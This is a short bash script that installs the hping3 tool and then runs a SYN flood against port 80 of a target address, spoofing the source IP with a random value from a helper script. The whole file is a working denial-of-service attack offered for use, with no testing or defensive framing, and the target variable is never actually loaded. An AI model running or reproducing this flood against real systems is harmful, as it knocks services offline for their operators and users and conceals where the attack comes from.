#!/bin/bash
REQUIRED="hping3"
OK=$(dpkg -s $REQUIRED|grep "install ok installed")

echo "Checking for $REQUIRED: $OK"
if [ "" = "$OK" ]; then
  echo "No $REQUIRED. Setting up $REQUIRED."
  sudo apt-get install $REQUIRED
fi

# Pull IP from the .env
#echo "Input IP Address:"
#read IP

#echo "Input Spoof IP Address:"
#read SPOOF
SPOOF=$(python ./randip.py)

echo "Executing SYN Flood ..."
flood () {
  sudo hping3 --flood $IP -a $SPOOF -S -p 80
}

flood